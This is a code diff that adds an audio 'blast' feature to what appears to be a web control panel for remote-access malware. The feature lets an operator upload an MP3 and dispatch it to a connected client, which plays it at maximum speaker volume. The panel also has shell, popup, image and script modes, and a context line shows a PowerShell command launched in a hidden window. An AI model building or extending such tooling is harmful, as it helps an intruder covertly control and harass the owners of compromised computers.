@@ -48,6 +48,7 @@ const RunApp = (() => {
         speak: 'Speak',
         popup_msg: 'Message',
         imager: 'Imager',
+        audio: 'Audio',
         scripts: 'Scripts',
         placeholder: 'Scripts'
     };
@@ -541,10 +542,12 @@ const RunApp = (() => {
         const isSpk = mode === 'speak';
         const isScripts = mode === 'scripts' || mode === 'placeholder';
         const isImager = mode === 'imager';
+        const isAudio = mode === 'audio';
 
-        if ($('textarea-wrap')) $('textarea-wrap').style.display = (isScripts || isImager) ? 'none' : 'flex';
+        if ($('textarea-wrap')) $('textarea-wrap').style.display = (isScripts || isImager || isAudio) ? 'none' : 'flex';
         if ($('placeholder-body')) $('placeholder-body').style.display = isScripts ? 'flex' : 'none';
         if ($('imager-section')) $('imager-section').style.display = isImager ? 'flex' : 'none';
+        if ($('audio-section')) $('audio-section').style.display = isAudio ? 'flex' : 'none';
         if ($('vis-section')) $('vis-section').style.display = isCmd ? 'flex' : 'none';
         if ($('shell-section')) $('shell-section').style.display = isCmd ? 'block' : 'none';
         if ($('voice-section')) $('voice-section').style.display = isSpk ? 'flex' : 'none';
@@ -569,6 +572,10 @@ const RunApp = (() => {
         if (isImager) {
             setTimeout(() => {
                 $('imager-caption-input')?.focus();
+            }, 50);
+        } else if (isAudio) {
+            setTimeout(() => {
+                $('audio-caption-input')?.focus();
             }, 50);
         } else if (!isScripts) {
             setTimeout(() => {
@@ -630,6 +637,7 @@ const RunApp = (() => {
 
     function closePopup() {
         resetImager();
+        resetAudio();
         $('textarea-wrap')?.classList.remove('show-hint');
         closeTargetDropdown();
         closeActionModeDropdown();
@@ -776,6 +784,152 @@ const RunApp = (() => {
             tempImg.src = rawDataUrl;
         };
         reader.readAsDataURL(file);
+    }
+
+    // ── Audio Mode State & File Handling ──
+    const audioState = {
+        file: null,
+        audioData: null,
+        fileName: '',
+        fileSizeText: '',
+        durationText: '',
+        audioPreviewObj: null,
+        isPlayingPreview: false
+    };
+
+    function stopAudioPreview() {
+        if (audioState.audioPreviewObj) {
+            audioState.audioPreviewObj.pause();
+            audioState.audioPreviewObj = null;
+        }
+        audioState.isPlayingPreview = false;
+        const btn = $('audio-preview-btn');
+        if (btn) {
+            btn.innerHTML = '<i class="bi bi-play-fill" id="audio-preview-icon"></i>';
+            btn.classList.remove('playing');
+        }
+    }
+
+    function resetAudio() {
+        stopAudioPreview();
+        audioState.file = null;
+        audioState.audioData = null;
+        audioState.fileName = '';
+        audioState.fileSizeText = '';
+        audioState.durationText = '';
+
+        const fileInput = $('audio-file-input');
+        const card = $('audio-card');
+        const iconWrap = $('audio-card-icon');
+        const titleSpan = $('audio-card-title');
+        const descSpan = $('audio-card-desc');
+        const previewBtn = $('audio-preview-btn');
+        const removeBtn = $('audio-remove-btn');
+        const captionInput = $('audio-caption-input');
+
+        if (fileInput) fileInput.value = '';
+        if (captionInput) captionInput.value = '';
+        if (card) {
+            card.classList.remove('has-file', 'dragover');
+        }
+        if (iconWrap) iconWrap.innerHTML = '<i class="bi bi-music-note-beamed"></i>';
+        if (titleSpan) titleSpan.textContent = 'Upload MP3 Audio';
+        if (descSpan) descSpan.textContent = 'Click or drag & drop MP3 file (blasts speaker at max volume)';
+        if (previewBtn) previewBtn.style.display = 'none';
+        if (removeBtn) removeBtn.style.display = 'none';
+    }
+
+    function formatDuration(seconds) {
+        if (!seconds || isNaN(seconds)) return '';
+        const m = Math.floor(seconds / 60);
+        const s = Math.floor(seconds % 60);
+        return `${m}:${s < 10 ? '0' : ''}${s}`;
+    }
+
+    function updateAudioCardUI() {
+        const card = $('audio-card');
+        const iconWrap = $('audio-card-icon');
+        const titleSpan = $('audio-card-title');
+        const descSpan = $('audio-card-desc');
+        const previewBtn = $('audio-preview-btn');
+        const removeBtn = $('audio-remove-btn');
+
+        if (card) {
+            card.classList.add('has-file');
+            card.classList.remove('dragover');
+        }
+        if (iconWrap) {
+            iconWrap.innerHTML = '<i class="bi bi-disc"></i>';
+        }
+        if (titleSpan) titleSpan.textContent = audioState.fileName;
+        const durPart = audioState.durationText ? ` · ${audioState.durationText}` : '';
+        if (descSpan) descSpan.textContent = `${audioState.fileSizeText}${durPart} · Max Speaker Volume`;
+        if (previewBtn) {
+            previewBtn.style.display = 'inline-flex';
+            previewBtn.innerHTML = '<i class="bi bi-play-fill" id="audio-preview-icon"></i>';
+        }
+        if (removeBtn) removeBtn.style.display = 'inline-flex';
+    }
+
+    function processAudioFile(file) {
+        if (!file) return;
+        const isAudio = file.type.startsWith('audio/') || file.name.match(/\.(mp3|wav|ogg|m4a|aac|wma)$/i);
+        if (!isAudio) {
+            alert('Please select a valid MP3 or audio file.');
+            return;
+        }
+
+        stopAudioPreview();
+
+        const reader = new FileReader();
+        reader.onload = e => {
+            const rawDataUrl = e.target.result;
+            const b64 = rawDataUrl.split(',')[1];
+
+            audioState.file = file;
+            audioState.audioData = b64;
+            audioState.fileName = file.name || 'audio.mp3';
+            audioState.fileSizeText = formatBytes(file.size || Math.round(b64.length * 0.75));
+            audioState.durationText = '';
+
+            const tempAudio = new Audio();
+            tempAudio.onloadedmetadata = () => {
+                if (tempAudio.duration && !isNaN(tempAudio.duration)) {
+                    audioState.durationText = formatDuration(tempAudio.duration);
+                    updateAudioCardUI();
+                }
+            };
+            tempAudio.src = rawDataUrl;
+
+            updateAudioCardUI();
+        };
+        reader.readAsDataURL(file);
+    }
+
+    function toggleAudioPreview() {
+        if (!audioState.audioData) return;
+        const previewBtn = $('audio-preview-btn');
+
+        if (audioState.isPlayingPreview && audioState.audioPreviewObj) {
+            stopAudioPreview();
+            return;
+        }
+
+        try {
+            const audio = new Audio(`data:audio/mp3;base64,${audioState.audioData}`);
+            audio.volume = 1.0;
+            audioState.audioPreviewObj = audio;
+            audioState.isPlayingPreview = true;
+            if (previewBtn) {
+                previewBtn.innerHTML = '<i class="bi bi-pause-fill" id="audio-preview-icon"></i>';
+                previewBtn.classList.add('playing');
+            }
+            audio.onended = () => stopAudioPreview();
+            audio.onerror = () => stopAudioPreview();
+            audio.play().catch(() => stopAudioPreview());
+        } catch {
+            stopAudioPreview();
+        }
     }
 
     // ── Command Building & Scripts ──
@@ -2168,6 +2322,14 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
                 {
                     id: 103,
                     username: username,
+                    op_type: 'AUDIO',
+                    details: 'Audio blast sent (alert.mp3) at max volume',
+                    status: 'dispatched',
+                    created_at: new Date(Date.now() - 400000).toISOString().replace('T', ' ').substring(0, 19)
+                },
+                {
+                    id: 103,
+                    username: username,
                     op_type: 'SPEAK',
                     details: 'Alert: System operational status confirmed',
                     status: 'dispatched',
@@ -2429,6 +2591,39 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
                 fetchData();
             } catch (err) {
                 alert('Failed to send image: ' + err.message);
+            } finally {
+                isSendingCommand = false;
+            }
+            return;
+        }
+
+        if (mode === 'audio') {
+            if (!audioState.audioData) {
+                alert('Please upload an MP3 audio file first.');
+                return;
+            }
+            isSendingCommand = true;
+            const captionVal = ($('audio-caption-input')?.value || '').trim();
+            try {
+                const res = await fetch(`${VPS_URL}/api/audio`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
+                    body: JSON.stringify({
+                        username: user.username,
+                        audio: audioState.audioData,
+                        filename: audioState.fileName || 'sound.mp3',
+                        title: captionVal
+                    })
+                });
+                if (!res.ok) {
+                    const err = await res.json().catch(() => ({}));
+                    alert(err.message || 'Failed to dispatch audio to client.');
+                    return;
+                }
+                closePopup();
+                fetchData();
+            } catch (err) {
+                alert('Failed to send audio: ' + err.message);
             } finally {
                 isSendingCommand = false;
             }
@@ -2821,6 +3016,7 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             }
             if (key === 'a' && alive) openPopup('popup_msg', u);
             if (key === 'i' && alive) openPopup('imager', u);
+            if (key === 'm' && alive) openPopup('audio', u);
             if (key === 'v') doViewOutput(u);
         });
 
@@ -2916,17 +3112,103 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             });
         }
 
-        // Paste support for Imager
+        // Audio upload & card listeners
+        const audioCard = $('audio-card');
+        const audioFileInput = $('audio-file-input');
+        const audioRemoveBtn = $('audio-remove-btn');
+        const audioPreviewBtn = $('audio-preview-btn');
+        const audioCaptionInput = $('audio-caption-input');
+
+        if (audioCard && audioFileInput) {
+            audioCard.addEventListener('click', e => {
+                if (e.target.closest('#audio-remove-btn') || e.target.closest('#audio-preview-btn')) return;
+                audioFileInput.click();
+            });
+
+            audioCard.addEventListener('keydown', e => {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    if (e.target.closest('#audio-remove-btn') || e.target.closest('#audio-preview-btn')) return;
+                    e.preventDefault();
+                    audioFileInput.click();
+                }
+            });
+
+            audioFileInput.addEventListener('change', e => {
+                if (e.target.files && e.target.files[0]) {
+                    processAudioFile(e.target.files[0]);
+                }
+            });
+
+            audioCard.addEventListener('dragover', e => {
+                e.preventDefault();
+                e.dataTransfer.dropEffect = 'copy';
+                audioCard.classList.add('dragover');
+            });
+            audioCard.addEventListener('dragenter', e => {
+                e.preventDefault();
+                audioCard.classList.add('dragover');
+            });
+            audioCard.addEventListener('dragleave', e => {
+                if (!audioCard.contains(e.relatedTarget)) {
+                    audioCard.classList.remove('dragover');
+                }
+            });
+            audioCard.addEventListener('drop', e => {
+                e.preventDefault();
+                audioCard.classList.remove('dragover');
+                if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                    processAudioFile(e.dataTransfer.files[0]);
+                }
+            });
+        }
+
+        if (audioPreviewBtn) {
+            audioPreviewBtn.addEventListener('click', e => {
+                e.stopPropagation();
+                toggleAudioPreview();
+            });
+        }
+
+        if (audioRemoveBtn) {
+            audioRemoveBtn.addEventListener('click', e => {
+                e.stopPropagation();
+                resetAudio();
+            });
+        }
+
+        if (audioCaptionInput) {
+            audioCaptionInput.addEventListener('keydown', e => {
+                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+                    e.preventDefault();
+                    doSendPopup();
+                }
+            });
+        }
+
+        // Paste support for Imager and Audio
         window.addEventListener('paste', e => {
-            if (runState.popupMode !== 'imager') return;
-            const items = e.clipboardData?.items;
-            if (!items) return;
-            for (let i = 0; i < items.length; i++) {
-                if (items[i].type.indexOf('image') !== -1) {
-                    const file = items[i].getAsFile();
-                    if (file) {
-                        processImagerFile(file);
-                        break;
+            if (runState.popupMode === 'imager') {
+                const items = e.clipboardData?.items;
+                if (!items) return;
+                for (let i = 0; i < items.length; i++) {
+                    if (items[i].type.indexOf('image') !== -1) {
+                        const file = items[i].getAsFile();
+                        if (file) {
+                            processImagerFile(file);
+                            break;
+                        }
+                    }
+                }
+            } else if (runState.popupMode === 'audio') {
+                const items = e.clipboardData?.items;
+                if (!items) return;
+                for (let i = 0; i < items.length; i++) {
+                    if (items[i].type.indexOf('audio') !== -1) {
+                        const file = items[i].getAsFile();
+                        if (file) {
+                            processAudioFile(file);
+                            break;
+                        }
                     }
                 }
             }
